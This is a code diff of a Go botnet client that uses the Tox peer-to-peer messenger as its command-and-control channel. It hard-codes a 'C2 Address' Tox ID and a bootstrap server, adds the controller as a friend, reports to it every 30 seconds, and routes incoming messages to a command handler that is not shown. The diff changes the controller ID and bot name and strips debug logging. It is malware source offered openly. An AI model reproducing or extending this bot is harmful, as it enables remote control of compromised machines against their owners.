@@ -23,11 +23,10 @@ var server = []interface{}{
 	"205.185.116.116", uint16(33445), "A179B09749AC826FF01F37A9613F6B57118AE014D4196A0E1105A98F93A54702",
 }
 
-var address = "67E1D07953FDBF050404DCECCEF8D75AFB6C32B6601427D289B6473649E9CD13F462D28978A7" // C2 Address
+var address = "2F4BE3E7E9BB1CA7F107EC8371DCB847202013B2BDC824B2111F12493190E67A727C0864E9E3" // C2 Address
 var fname = "./tox.data"
-var debug = false
-var nickPrefix = "Odin"
-var statusText = "Revered immortal."
+var nickPrefix = "client"
+var statusText = "Toxnet Bot."
 
 // Commands - Handle incoming commands
 func Commands(t *tox.Tox, friendNumber uint32, command string) {
@@ -91,19 +90,8 @@ func main() {
 		}
 	}
 
-	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
-	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
-	if debug {
-		log.Println("bootstrap:", r, err, r2)
-	}
-
-	pubkey := t.SelfGetPublicKey()
-	seckey := t.SelfGetSecretKey()
 	toxid := t.SelfGetAddress()
-	if debug {
-		log.Println("keys:", pubkey, seckey, len(pubkey), len(seckey))
-	}
-	log.Println("toxid:", toxid)
+	fmt.Println("Bot ToxID: ", toxid)
 
 	defaultName := t.SelfGetName()
 	humanName := nickPrefix + toxid[0:5]
@@ -111,28 +99,12 @@ func main() {
 		t.SelfSetName(humanName)
 	}
 	humanName = t.SelfGetName()
-	if debug {
-		log.Println(humanName, defaultName, err)
-	}
-
 	defaultStatusText, err := t.SelfGetStatusMessage()
 	if defaultStatusText != statusText {
 		t.SelfSetStatusMessage(statusText)
 	}
-	if debug {
-		log.Println(statusText, defaultStatusText, err)
-	}
 
-	sz := t.GetSavedataSize()
-	sd := t.GetSavedata()
-	if debug {
-		log.Println("savedata:", sz, t)
-		log.Println("savedata", len(sd), t)
-	}
 	err = t.WriteSavedata(fname)
-	if debug {
-		log.Println("savedata write:", err)
-	}
 
 	// Add C2
 	t.FriendAdd(address, "incoming")
@@ -141,7 +113,6 @@ func main() {
 	go func() {
 		for {
 			time.Sleep(30 * time.Second)
-			fmt.Println("Send update")
 			fv := t.SelfGetFriendList()
 			for _, fno := range fv {
 				if err != nil {
@@ -155,9 +126,6 @@ func main() {
 
 	// Recieve commands
 	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
-		if debug {
-			log.Println("on friend message:", friendNumber, message)
-		}
 		Commands(t, friendNumber, message)
 	}, nil)
 
@@ -168,27 +136,10 @@ func main() {
 	for !shutdown {
 		iv := t.IterationInterval()
 		if iv != itval {
-			if debug {
-				if itval-iv > 20 || iv-itval > 20 {
-					log.Println("tox itval changed:", itval, iv)
-				}
-			}
 			itval = iv
 		}
 
 		t.Iterate()
-		status := t.SelfGetConnectionStatus()
-		if loopc%5500 == 0 {
-			if status == 0 {
-				if debug {
-					fmt.Print(".")
-				}
-			} else {
-				if debug {
-					fmt.Print(status, ",")
-				}
-			}
-		}
 		loopc++
 		time.Sleep(1000 * 50 * time.Microsecond)
 	}
